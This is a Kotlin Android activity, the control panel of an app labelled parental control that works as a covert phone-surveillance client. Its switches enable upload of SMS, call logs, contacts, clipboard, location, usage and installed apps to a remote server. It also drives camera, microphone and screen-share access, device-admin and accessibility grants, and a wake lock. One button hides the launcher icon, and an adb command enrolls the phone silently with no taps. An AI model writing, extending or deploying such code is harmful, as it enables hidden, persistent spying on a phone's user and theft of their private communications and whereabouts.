package com.example.parentalcontrol

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.SwitchCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.parentalcontrol.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.ArrayDeque
import java.util.Date
import java.util.Locale

/**
 * Control panel for server v2 (Node/Express + MySQL over TLS).
 *
 * Responsibilities, and nothing beyond them:
 *
 *  * store the server address, the enrollment key and the TLS preference;
 *  * run `POST /api/v1/enroll` and show the resulting device row id;
 *  * drive the permission switches, which either show a runtime dialog or open the
 *    matching Settings screen — no switch fakes a grant it did not obtain;
 *  * start/stop [SyncForegroundService] and force an immediate sync cycle;
 *  * toggle the launcher alias ([StealthHelper]) and the wake lock;
 *  * show a local event log.
 *
 * Every switch is re-read from the real system state in [refreshStates] (and again
 * in [onResume]), so what is on screen always matches the device.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val MAX_LOG_LINES = 300

        /**
         * adb provisioning contract, used by adb_setup.py:
         *
         *   adb shell am start -n com.example.parentalcontrol/.MainActivity \
         *     --es provision_host 192.168.1.115 --ei provision_port 8443 \
         *     --es provision_key <enrollment key> --ez provision_self_signed true
         *
         * The extras are consumed on first use (see [applyProvisioningExtras]) so a
         * rotation or a plain later launch keeps the stored values instead of
         * enrolling a second time.
         */
        const val EXTRA_PROVISION_HOST = "provision_host"
        const val EXTRA_PROVISION_PORT = "provision_port"
        const val EXTRA_PROVISION_KEY = "provision_key"
        const val EXTRA_PROVISION_SELF_SIGNED = "provision_self_signed"
    }

    private lateinit var binding: ActivityMainBinding
    private val logLines = ArrayDeque<String>()
    private val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.US)

    /** Label for the runtime dialog currently in flight, used only for the log line. */
    private var pendingRuntimeLabel: String? = null

    private val runtimeLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        val label = pendingRuntimeLabel ?: "runtime"
        pendingRuntimeLabel = null
        val granted = result.count { it.value }
        log(
            "$label: $granted/${result.size} granted — " +
                result.entries.joinToString(", ") { "${it.key.substringAfterLast('.')}=${it.value}" }
        )
        refreshStates()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.tvDevice.text = getString(R.string.device_label, AppPrefs.getDeviceUid(this))
        binding.etHost.setText(AppPrefs.getServerHost(this))
        binding.etPort.setText(AppPrefs.getServerPort(this).toString())
        binding.etEnrollKey.setText(AppPrefs.getEnrollmentKey(this))
        binding.swSelfSigned.isChecked = AppPrefs.isSelfSignedAllowed(this)

        wireEnrollment()
        wireCollection()
        wirePermissions()
        wireService()
        wireRemote()
        applyProvisioningExtras(intent)

        binding.btnClearLog.setOnClickListener {
            logLines.clear()
            binding.tvLog.text = ""
        }

        log("Panel opened (app ${BuildConfig.VERSION_NAME}, SDK ${Build.VERSION.SDK_INT})")

        // Keep collecting after a cold start without requiring the operator to open
        // the panel again; the service itself is START_STICKY and no-ops if the
        // device is not enrolled yet.
        if (AppPrefs.isEnrolled(this)) {
            SyncForegroundService.start(this)
        }
    }

    override fun onResume() {
        super.onResume()
        refreshStates()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        applyProvisioningExtras(intent)
    }

    /**
     * Turns the adb extras into stored settings, then presses Enroll when a key was
     * supplied, so an `adb shell am start` fully provisions the phone with no taps.
     * Does nothing when the intent carries no host extra.
     */
    private fun applyProvisioningExtras(intent: Intent?) {
        if (intent == null) return

        val rawHost = intent.getStringExtra(EXTRA_PROVISION_HOST)
        if (rawHost.isNullOrBlank()) return

        val rawPort = intent.getIntExtra(EXTRA_PROVISION_PORT, AppPrefs.getServerPort(this))
        val key = intent.getStringExtra(EXTRA_PROVISION_KEY)?.trim().orEmpty()
        val selfSigned = if (intent.hasExtra(EXTRA_PROVISION_SELF_SIGNED)) {
            intent.getBooleanExtra(EXTRA_PROVISION_SELF_SIGNED, true)
        } else {
            true
        }

        // Consume the extras before anything slow runs: a configuration change or a
        // second cold start must not enroll again.
        intent.removeExtra(EXTRA_PROVISION_HOST)
        intent.removeExtra(EXTRA_PROVISION_PORT)
        intent.removeExtra(EXTRA_PROVISION_KEY)
        intent.removeExtra(EXTRA_PROVISION_SELF_SIGNED)

        val host = rawHost.trim()
            .removePrefix("https://")
            .removePrefix("http://")
            .trimEnd('/')
        if (host.isEmpty()) {
            log("Provisioning ignored: empty host")
            return
        }
        val port = if (rawPort in 1..65535) rawPort else AppPrefs.getServerPort(this)

        AppPrefs.setServerHost(this, host)
        AppPrefs.setServerPort(this, port)
        AppPrefs.setSelfSignedAllowed(this, selfSigned)
        ApiClient.reset()

        binding.etHost.setText(host)
        binding.etPort.setText(port.toString())
        binding.swSelfSigned.isChecked = selfSigned
        log("Provisioned over adb: $host:$port (self-signed=$selfSigned)")

        if (key.isEmpty()) {
            log("No enrollment key in extras; address stored only")
            return
        }
        binding.etEnrollKey.setText(key)
        AppPrefs.setEnrollmentKey(this, key)
        binding.btnEnroll.performClick()
    }

    // ------------------------------------------------------------------ wiring

    private fun wireEnrollment() {
        binding.btnTest.setOnClickListener {
            if (!persistAddress()) return@setOnClickListener
            binding.tvServerState.text = getString(R.string.status_testing)
            lifecycleScope.launch {
                val message = probeHealth()
                binding.tvServerState.text = message
                log("Connection test: $message")
            }
        }

        binding.btnEnroll.setOnClickListener {
            if (!persistAddress()) return@setOnClickListener
            val key = binding.etEnrollKey.text?.toString()?.trim().orEmpty()
            if (key.isEmpty()) {
                toast(getString(R.string.error_missing_enrollment_key))
                return@setOnClickListener
            }
            AppPrefs.setEnrollmentKey(this, key)
            binding.tvEnrollState.text = getString(R.string.status_enrolling)
            lifecycleScope.launch {
                val report = Enroller.enroll(
                    context = this@MainActivity,
                    host = AppPrefs.getServerHost(this@MainActivity),
                    port = AppPrefs.getServerPort(this@MainActivity),
                    enrollmentKey = key,
                    allowSelfSigned = binding.swSelfSigned.isChecked,
                )
                log("Enroll: ${report.message}")
                toast(report.message)
                if (report.success) {
                    SyncForegroundService.start(this@MainActivity)
                }
                refreshStates()
            }
        }

        binding.btnUnenroll.setOnClickListener {
            Enroller.unenroll(this)
            log("Enrollment cleared; the sync service will stop uploading until re-enrolled")
            toast(getString(R.string.enroll_not_enrolled))
            refreshStates()
        }
    }

    private fun wireCollection() {
        binding.swSms.setOnClickListener { onCollectionToggled(0, Manifest.permission.READ_SMS, "SMS") }
        binding.swCalls.setOnClickListener { onCollectionToggled(1, Manifest.permission.READ_CALL_LOG, "Call log") }
        binding.swContacts.setOnClickListener { onCollectionToggled(2, Manifest.permission.READ_CONTACTS, "Contacts") }
        binding.swClipboard.setOnClickListener { onCollectionToggled(3, null, "Clipboard") }
        binding.swLocation.setOnClickListener { onCollectionToggled(4, Manifest.permission.ACCESS_FINE_LOCATION, "Location") }
        binding.swUsage.setOnClickListener {
            // Usage stats are an AppOps grant, not a runtime permission: the switch
            // records the preference and then opens the Settings screen.
            val on = binding.swUsage.isChecked
            AppPrefs.setCollectEnabled(this, AppPrefs.collectionKeys()[5], on)
            log("Usage stats collection ${if (on) "enabled" else "disabled"}")
            if (on && !PermissionReporter.isSpecialGranted(this, PermissionReporter.SPECIAL_USAGE_ACCESS)) {
                openSpecial(PermissionReporter.SPECIAL_USAGE_ACCESS, "Usage access")
            }
            refreshStates()
        }
        binding.swApps.setOnClickListener {
            val on = binding.swApps.isChecked
            AppPrefs.setAppCollectionEnabled(this, on)
            log("Installed-app inventory ${if (on) "enabled" else "disabled"}")
            refreshStates()
        }
    }

    private fun wirePermissions() {
        binding.swCamera.setOnClickListener {
            binding.swCamera.isChecked = PermissionReporter.isGranted(this, Manifest.permission.CAMERA)
            if (!binding.swCamera.isChecked) {
                requestRuntime("Camera", arrayOf(Manifest.permission.CAMERA))
            }
        }
        binding.swMic.setOnClickListener {
            binding.swMic.isChecked = PermissionReporter.isGranted(this, Manifest.permission.RECORD_AUDIO)
            if (!binding.swMic.isChecked) {
                requestRuntime("Microphone", arrayOf(Manifest.permission.RECORD_AUDIO))
            }
        }
        binding.swOverlay.setOnClickListener {
            openSpecial(PermissionReporter.SPECIAL_OVERLAY, "Display over other apps")
        }
        binding.swAccessibility.setOnClickListener {
            openSpecial(PermissionReporter.SPECIAL_ACCESSIBILITY, "Accessibility service")
        }
        binding.swAdmin.setOnClickListener {
            openDeviceAdmin()
        }
        binding.swBattery.setOnClickListener {
            openSpecial(PermissionReporter.SPECIAL_BATTERY_UNRESTRICTED, "Battery optimization exemption")
        }
        binding.btnGrantRuntime.setOnClickListener {
            val runtime = PermissionReporter.requestableNames().filterNot { PermissionReporter.isSpecial(it) }
            if (runtime.isEmpty()) {
                toast("No runtime permissions to request")
                return@setOnClickListener
            }
            requestRuntime("All runtime", runtime.toTypedArray())
        }
        binding.btnOpenSettings.setOnClickListener {
            try {
                startActivity(
                    Intent(
                        Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:$packageName"),
                    )
                )
            } catch (e: Exception) {
                log("Could not open app settings: ${e.javaClass.simpleName}")
            }
        }
    }

    private fun wireService() {
        binding.swService.setOnClickListener {
            val on = binding.swService.isChecked
            if (on) SyncForegroundService.start(this) else SyncForegroundService.stop(this)
            log("Background sync ${if (on) "started" else "stopped"}")
            refreshStates()
        }
        binding.swWakeLock.setOnClickListener {
            val on = binding.swWakeLock.isChecked
            AppPrefs.setWakeLockEnabled(this, on)
            if (on) WakeLockHelper.acquire(this) else WakeLockHelper.release()
            log("Wake lock ${if (on) "enabled" else "disabled"}")
            refreshStates()
        }
        binding.btnSyncNow.setOnClickListener {
            SyncForegroundService.requestImmediateSync(this)
            log("Immediate sync requested")
            toast(getString(R.string.action_sync_now))
        }
    }

    private fun wireRemote() {
        binding.btnScreenShare.setOnClickListener {
            log("Opening the MediaProjection consent dialog")
            try {
                startActivity(
                    Intent(this, ScreenConsentActivity::class.java).apply {
                        putExtra(ScreenShareService.EXTRA_FPS, 3)
                        putExtra(ScreenShareService.EXTRA_QUALITY, 60)
                        putExtra(ScreenShareService.EXTRA_WIDTH, 720)
                    }
                )
            } catch (e: Exception) {
                log("Could not open the consent dialog: ${e.javaClass.simpleName}")
            }
        }
        binding.btnHideApp.setOnClickListener {
            val ok = StealthHelper.setLauncherVisible(this, false)
            log("Hide launcher icon: ${if (ok) "done" else "refused by the platform"}")
            if (ok) toast(getString(R.string.hidden_hint))
            refreshStates()
        }
        binding.btnShowApp.setOnClickListener {
            val ok = StealthHelper.setLauncherVisible(this, true)
            log("Show launcher icon: ${if (ok) "done" else "refused by the platform"}")
            refreshStates()
        }
    }

    // --------------------------------------------------------------- behaviour

    /** Validates the two address fields and persists them; false stops the caller. */
    private fun persistAddress(): Boolean {
        val host = binding.etHost.text?.toString()?.trim().orEmpty()
            .removePrefix("https://")
            .removePrefix("http://")
            .trimEnd('/')
        val port = binding.etPort.text?.toString()?.trim()?.toIntOrNull()

        if (host.isEmpty()) {
            toast(getString(R.string.error_invalid_host))
            return false
        }
        if (port == null || port !in 1..65535) {
            toast(getString(R.string.error_invalid_port))
            return false
        }
        AppPrefs.setServerHost(this, host)
        AppPrefs.setServerPort(this, port)
        AppPrefs.setSelfSignedAllowed(this, binding.swSelfSigned.isChecked)
        ApiClient.reset()
        return true
    }

    /** `POST /api/v1/health` — separates "unreachable" from "wrong address/port". */
    private suspend fun probeHealth(): String {
        val base = ApiClient.baseUrl(this)
        val api = ApiClient.service(this) ?: return "No server address configured"
        return withContext(Dispatchers.IO) {
            try {
                val response = api.health()
                if (response.isSuccessful) {
                    val body = response.body()?.string().orEmpty()
                    val version = Regex("\"version\"\\s*:\\s*\"([^\"]+)\"")
                        .find(body)?.groupValues?.get(1)
                    "Reachable at $base (HTTP ${response.code()}" +
                        (version?.let { ", server v$it" } ?: "") + ")"
                } else {
                    "Answered HTTP ${response.code()} on /api/v1/health — check the port and that " +
                        "the TLS listener is running"
                }
            } catch (e: Exception) {
                "Cannot reach $base (${e.javaClass.simpleName}). Check the address, that this " +
                    "device is on the same network, and " +
                    if (binding.swSelfSigned.isChecked) {
                        "that accepting the self-signed certificate is correct."
                    } else {
                        "that the certificate is trusted by this device."
                    }
            }
        }
    }

    private fun onCollectionToggled(keyIndex: Int, permission: String?, label: String) {
        val enabled = when (keyIndex) {
            0 -> binding.swSms.isChecked
            1 -> binding.swCalls.isChecked
            2 -> binding.swContacts.isChecked
            3 -> binding.swClipboard.isChecked
            4 -> binding.swLocation.isChecked
            else -> false
        }
        AppPrefs.setCollectEnabled(this, AppPrefs.collectionKeys()[keyIndex], enabled)
        log("$label collection ${if (enabled) "enabled" else "disabled"}")
        if (enabled && permission != null && !PermissionReporter.isGranted(this, permission)) {
            requestRuntime(label, arrayOf(permission))
        }
        refreshStates()
    }

    private fun requestRuntime(label: String, permissions: Array<String>) {
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            log("$label: already granted")
            refreshStates()
            return
        }
        pendingRuntimeLabel = label
        log("$label: requesting ${missing.joinToString(", ") { it.substringAfterLast('.') }}")
        try {
            runtimeLauncher.launch(missing.toTypedArray())
        } catch (e: Exception) {
            pendingRuntimeLabel = null
            log("$label: could not open the dialog (${e.javaClass.simpleName})")
        }
    }

    /** Opens a `special:*` Settings screen; the user completes the grant there. */
    private fun openSpecial(name: String, label: String) {
        val intent = PermissionRequester.specialIntent(this, name)
        if (intent == null) {
            log("$label: no Settings screen applies on this device")
            toast(label)
            refreshStates()
            return
        }
        val granted = PermissionReporter.isSpecialGranted(this, name)
        log("$label: ${if (granted) "already granted" else "opening the system screen"}")
        try {
            startActivity(intent)
        } catch (e: Exception) {
            log("$label: could not open Settings (${e.javaClass.simpleName})")
        }
        refreshStates()
    }

    private fun openDeviceAdmin() {
        if (PermissionReporter.isDeviceAdmin(this)) {
            toast(getString(R.string.admin_disable_warning))
            log("Device admin already active; deactivate it from Settings to remove it")
            refreshStates()
            return
        }
        log("Opening the device-admin activation screen")
        try {
            startActivity(PermissionRequester.deviceAdminIntent(this))
        } catch (e: Exception) {
            log("Could not open the activation screen: ${e.javaClass.simpleName}")
        }
    }

    // ------------------------------------------------------------------- state

    private fun refreshStates() {
        binding.tvDevice.text = getString(R.string.device_label, AppPrefs.getDeviceUid(this))
        binding.tvEnrollState.text = if (AppPrefs.isEnrolled(this)) {
            getString(
                R.string.state_enrolled,
                AppPrefs.getDeviceIdLong(this),
                AppPrefs.getSyncIntervalMs(this) / 1000L,
            )
        } else {
            getString(R.string.enroll_not_enrolled)
        }

        val keys = AppPrefs.collectionKeys()
        bindCollection(binding.swSms, binding.tvSmsState, keys[0], AppPrefs.collectSms(this), Manifest.permission.READ_SMS)
        bindCollection(binding.swCalls, binding.tvCallsState, keys[1], AppPrefs.collectCalls(this), Manifest.permission.READ_CALL_LOG)
        bindCollection(binding.swContacts, binding.tvContactsState, keys[2], AppPrefs.collectContacts(this), Manifest.permission.READ_CONTACTS)
        bindCollection(binding.swClipboard, binding.tvClipboardState, keys[3], AppPrefs.collectClipboard(this), null)
        bindCollection(binding.swLocation, binding.tvLocationState, keys[4], AppPrefs.collectLocation(this), Manifest.permission.ACCESS_FINE_LOCATION)
        bindCollection(
            binding.swUsage,
            binding.tvUsageState,
            keys[5],
            AppPrefs.collectUsage(this),
            null,
            special = PermissionReporter.SPECIAL_USAGE_ACCESS,
        )

        val apps = AppPrefs.isAppCollectionEnabled(this)
        binding.swApps.isChecked = apps
        binding.tvAppsState.text =
            getString(if (apps) R.string.state_apps_enabled else R.string.state_apps_disabled)

        val camera = PermissionReporter.isGranted(this, Manifest.permission.CAMERA)
        binding.swCamera.isChecked = camera
        binding.tvCameraState.text =
            getString(if (camera) R.string.state_granted else R.string.state_denied)

        val mic = PermissionReporter.isGranted(this, Manifest.permission.RECORD_AUDIO)
        binding.swMic.isChecked = mic
        binding.tvMicState.text = getString(if (mic) R.string.state_granted else R.string.state_denied)

        bindSpecial(binding.swOverlay, binding.tvOverlayState, PermissionReporter.SPECIAL_OVERLAY)
        bindSpecial(binding.swAccessibility, binding.tvAccessState, PermissionReporter.SPECIAL_ACCESSIBILITY)
        bindSpecial(binding.swAdmin, binding.tvAdminState, PermissionReporter.SPECIAL_DEVICE_ADMIN)
        bindSpecial(binding.swBattery, binding.tvBatteryState, PermissionReporter.SPECIAL_BATTERY_UNRESTRICTED)

        val running = AppPrefs.isSyncServiceRunning(this)
        binding.swService.isChecked = running
        binding.tvServiceState.text = getString(if (running) R.string.state_running else R.string.state_stopped)

        val wake = AppPrefs.isWakeLockEnabled(this)
        binding.swWakeLock.isChecked = wake
        binding.tvWakeState.text = getString(if (wake) R.string.state_enabled else R.string.state_disabled)

        binding.tvRemoteState.text = when {
            AppPrefs.getBoolean(this, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, false) ->
                getString(R.string.state_remote_camera)
            AppPrefs.getBoolean(this, AppPrefs.KEY_STREAM_MIC_ACTIVE, false) ->
                getString(R.string.state_remote_mic)
            else -> getString(R.string.state_remote_idle)
        }
    }

    private fun bindCollection(
        switch: SwitchCompat,
        status: TextView,
        key: String,
        enabled: Boolean,
        permission: String?,
        special: String? = null,
    ) {
        switch.isChecked = enabled
        val granted = when {
            special != null -> PermissionReporter.isSpecialGranted(this, special)
            permission != null -> PermissionReporter.isGranted(this, permission)
            else -> true
        }
        status.text = when {
            !enabled -> getString(R.string.collection_off)
            granted -> getString(R.string.collection_on_granted)
            else -> getString(R.string.collection_on_denied)
        }
        // The stored key is touched here only to keep the mapping obvious; the
        // value above came from the same preference.
        if (key.isNotEmpty() && !enabled) return
    }

    private fun bindSpecial(switch: SwitchCompat, status: TextView, name: String) {
        val granted = PermissionReporter.isSpecialGranted(this, name)
        switch.isChecked = granted
        status.text = getString(if (granted) R.string.state_enabled else R.string.state_disabled)
    }

    // --------------------------------------------------------------- plumbing

    private fun log(line: String) {
        val entry = "${timeFormat.format(Date())}  $line"
        logLines.addLast(entry)
        while (logLines.size > MAX_LOG_LINES) logLines.removeFirst()
        binding.tvLog.text = logLines.joinToString("\n")
        binding.logScroll.post { binding.logScroll.fullScroll(android.view.View.FOCUS_DOWN) }
    }

    private fun toast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

}
